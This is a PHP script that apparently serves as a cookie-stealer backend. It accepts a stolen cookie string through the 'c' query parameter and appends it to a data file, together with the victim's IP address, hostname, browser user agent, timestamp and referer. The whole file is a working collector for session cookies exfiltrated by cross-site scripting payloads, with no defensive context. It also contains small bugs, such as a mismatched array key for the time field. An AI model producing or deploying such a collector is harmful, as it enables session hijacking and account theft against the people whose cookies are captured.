<?php

include('config.php');

function build_array($cookie_str){
    $carray = array();
    
    $carray['ip']= $_SERVER['REMOTE_ADDR'];
    $carray['host'] = gethostbyaddr($carray['ip']);
    $carray['navigator'] = $_SERVER['HTTP_USER_AGENT'];
    $carray['date'] = date("d/m/Y");
    $carray['hour'] = date("H:i:s");
    $carray['referer'] = (!empty($_SERVER['HTTP_REFERER'])) ? $_SERVER['HTTP_REFERER'] : 'Unspecified';
    $carray['data'] = $cookie_str;
    return $carray; 
}

function parse_data($d){
    $str = $d['ip'] . "|" . $d['host'] . '|' . $d['navigator'] . "|" . $d['date'] . "|" . $d['heure'] . "|" . $d['referer'] . "|" . $d['data'];
    return $str;
}

function save_data($d){
    try {
        global $DATA_PATH;
        $cookiestr = parse_data($d);
        $data = file_get_contents($DATA_PATH);
        $data = $data . $cookiestr . "\n";
        file_put_contents($DATA_PATH, $data);
        return true;
    } catch (Exception $e) {
       log_err($e->getMEssage());
       return false;
    }
}

function log_info($message){
    try {
        global $LOG_PATH;
        $data = file_get_contents($LOG_PATH);
        $data = $data . $message . "\n";
        file_put_contents($LOG_PATH, $data);
        return true;
    } catch (Exception $e){
       log_err($e->getMEssage() . '\n');
       return false;
    }
}

function log_err($message){
    try {
        global $ERROR_PATH;
        $data = file_get_contents($ERROR_PATH);
        $data = $data . $message . "\n";
        file_put_contents($ERROR_PATH, $data);
        return true;
    } catch (Exception $e){
       log_err($e->getMEssage() . '\n');
       return false;
    }
}

if(isset($_GET['c']) and !empty($_GET['c'])){
    $array = build_array($_GET['c']);
    save_data($array);
} 
?>
